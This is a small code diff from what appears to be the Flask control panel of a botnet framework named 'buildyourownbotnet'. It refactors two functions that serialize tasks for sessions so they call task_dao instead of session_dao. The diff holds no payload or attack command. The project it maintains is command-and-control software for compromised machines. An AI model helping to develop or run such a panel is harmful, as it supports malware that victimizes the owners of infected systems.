@@ -6,7 +6,7 @@ import requests
 
 from threading import Thread
 
-from buildyourownbotnet.core.dao import session_dao
+from buildyourownbotnet.core.dao import session_dao, task_dao
 from buildyourownbotnet import app
 
 from flask import url_for
@@ -22,7 +22,7 @@ def get_sessions_serialized(user_id):
 
 def get_tasks_serialized(session_uid):
 	"""Return serialized list of tasks for a given session."""
-	tasks = session_dao.get_session_tasks(session_uid)
+	tasks = task_dao.get_session_tasks(session_uid)
 	serialized_tasks = []
 	for task in tasks:
 		task = task.serialize()
@@ -34,7 +34,7 @@ def get_tasks_serialized(session_uid):
 
 def get_tasks_serialized_paginated(session_id, page=1):
 	"""Return serialized list of tasks for a given session (paginated)."""
-	tasks, pages = session_dao.get_session_tasks_paginated(session_id, page=page)
+	tasks, pages = task_dao.get_session_tasks_paginated(session_id, page=page)
 	serialized_tasks = []
 	for task in tasks:
 		task = task.serialize()
